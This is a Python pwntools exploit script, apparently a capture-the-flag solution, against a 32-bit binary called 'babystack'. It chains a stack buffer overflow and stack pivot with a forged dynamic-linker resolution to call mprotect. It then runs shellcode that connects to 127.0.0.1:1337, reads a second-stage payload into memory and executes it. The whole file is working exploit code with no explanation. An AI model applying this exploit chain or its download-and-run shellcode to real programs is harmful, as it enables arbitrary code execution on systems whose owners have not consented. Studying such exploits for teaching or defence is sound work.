from pwn import *


r = process(["./babystack"])

# 0x080484e9 : pop esi ; pop edi ; pop ebp ; ret
# 0x8048300 <read@plt>
# 0x8048455: leave ; ret ;

rel_plt = 0x80482b0
dynsym = 0x80481cc
dynstr = 0x0804822c
alarm_got = 0x804a010


reloc = 0x0804ad00
reloc_idx = reloc - rel_plt
dynsym_idx = (reloc+0x0c-dynsym)/0x10
dynstr_idx = (reloc+0x1c-dynstr)
reloc_val = flat([alarm_got,dynsym_idx<<8|0x7,0x0,dynstr_idx,0x0,0x0,0x0],"mprotect"+"\x00"*4+"/bin/bash\x00")
dl_resolve = 0x804830b
ebp = 0x0804aa00
shell_addr = 0x0804ae00

sh="""
push 0x0
push 0x1
push 0x2
push 0x66
pop eax
push 0x1
pop ebx
mov ecx,esp
int 0x80
push 0x0100007f
push 0x39050002
mov ecx,esp
push 0x10
push ecx
push eax
push 0x66
pop eax
push 0x3
pop ebx
mov ecx,esp
int 0x80
mov eax,0x3
mov ebx,eax
mov edx,0x100
mov ecx,0x0804a100
int 0x80
call ecx
"""


shell_val = asm(sh)


stack = flat([
ebp+0x200,
0x8048300,
0x080484e9,
0x0,
reloc,
len(reloc_val),
dl_resolve,
reloc_idx,
0x080484e9,
0x804a000,
0x1000,
0x7,
0x8048300,
shell_addr,
0x0,
shell_addr,
len(shell_val),
])


payload = flat("a"*0x28,[ebp,
0x8048300,
0x8048455,
0x0,
ebp,
len(stack)])


total_paylaod = payload+stack+reloc_val+shell_val

print "OK",hex(len(total_paylaod))
r.send(total_paylaod)

r.interactive()

